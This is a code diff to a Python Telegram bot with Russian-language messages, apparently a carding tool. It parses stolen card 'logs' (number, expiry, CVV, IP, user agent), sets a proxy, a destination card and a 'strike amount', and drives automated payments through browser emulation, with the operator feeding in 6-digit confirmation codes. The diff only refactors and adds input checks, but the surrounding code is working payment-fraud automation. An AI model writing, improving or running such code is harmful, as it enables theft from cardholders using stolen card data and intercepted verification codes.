@@ -1,4 +1,7 @@
-import os, re, sqlite3, asyncio
+import os
+import re
+import sqlite3
+import asyncio
 from datetime import datetime
 from aiogram import Bot, Dispatcher, types
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
@@ -12,14 +15,12 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
 DB_PATH = "/var/data/sessions.db"
 
-# ========== FLASK ==========
 app = Flask(__name__)
 @app.route('/ping')
 def ping(): return "OK", 200
 def run_flask(): app.run(host='0.0.0.0', port=10000)
 threading.Thread(target=run_flask, daemon=True).start()
 
-# ========== БОТ ==========
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(bot)
 dp.middleware.setup(LoggingMiddleware())
@@ -29,7 +30,6 @@ def get_main_menu():
     kb.add(KeyboardButton("🏠 Главное меню"), KeyboardButton("⚙️ Админ-панель"))
     return kb
 
-# ========== БАЗА ==========
 def init_db():
     os.makedirs("/var/data", exist_ok=True)
     conn = sqlite3.connect(DB_PATH)
@@ -50,6 +50,7 @@ def init_db():
     )""")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('card_to', '')")
     c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('proxy', '')")
+    c.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('default_amount', '1000')")
     conn.commit()
     conn.close()
 
@@ -104,7 +105,6 @@ def get_session(session_id):
     conn.close()
     return row
 
-# ========== ПАРСЕР ==========
 def parse_log(text):
     data = {"card": None, "expiry": None, "cvv": None, "ip": None, "user_agent": None}
     lines = text.split("\n")
@@ -128,7 +128,6 @@ def parse_log(text):
     if not data["user_agent"]: data["user_agent"] = "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"
     return data
 
-# ========== ЭМУЛЯЦИЯ ==========
 async def emulate_payment(session_id, code=None):
     session = get_session(session_id)
     if not session: return "Сессия не найдена"
@@ -165,7 +164,6 @@ async def emulate_payment(session_id, code=None):
         error_text = await page.text_content('.error')
         return f"❌ Ошибка: {error_text or 'неизвестная'}"
 
-# ========== КОМАНДЫ ==========
 @dp.message_handler(commands=['start'])
 async def start_cmd(msg: types.Message):
     if msg.from_user.id != ADMIN_ID: return
@@ -227,16 +225,16 @@ async def show_status(callback: types.CallbackQuery):
     await callback.message.reply(f"📊 Настройки:\n💳 Карта: {card}\n🔄 Прокси: {proxy}\n💰 Сумма: {amount} UAH")
     await callback.answer()
 
-# ========== ОБРАБОТКА ОТВЕТОВ ==========
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.reply_to_message)
 async def handle_reply(msg: types.Message):
     text = msg.reply_to_message.text
     user_input = msg.text.strip()
 
-    # Проверяем, является ли ответ числом
-    if user_input.isdigit() and "сумму удара" in text:
+    if "сумму удара" in text:
+        if not user_input.isdigit():
+            await msg.reply("❌ Введи число!")
+            return
         amount = int(user_input)
-        # Ищем сессию по ID сообщения, на которое ответили
         session = get_session_by_msg(msg.reply_to_message.message_id)
         if not session:
             await msg.reply("❌ Сессия не найдена. Отправь лог заново.")
@@ -255,8 +253,10 @@ async def handle_reply(msg: types.Message):
             await msg.reply(result)
         return
 
-    # Если ответ — 6 цифр и есть запрос кода
-    if user_input.isdigit() and len(user_input) == 6 and "код" in text:
+    if "код" in text:
+        if not user_input.isdigit() or len(user_input) != 6:
+            await msg.reply("❌ 6 цифр!")
+            return
         session = get_session_by_msg(msg.reply_to_message.message_id)
         if not session:
             await msg.reply("❌ Сессия не найдена.")
@@ -268,7 +268,6 @@ async def handle_reply(msg: types.Message):
         await msg.reply(result)
         return
 
-    # Настройки
     if "номер карты" in text:
         set_setting('card_to', user_input)
         await msg.reply("✅ Карта обновлена!")
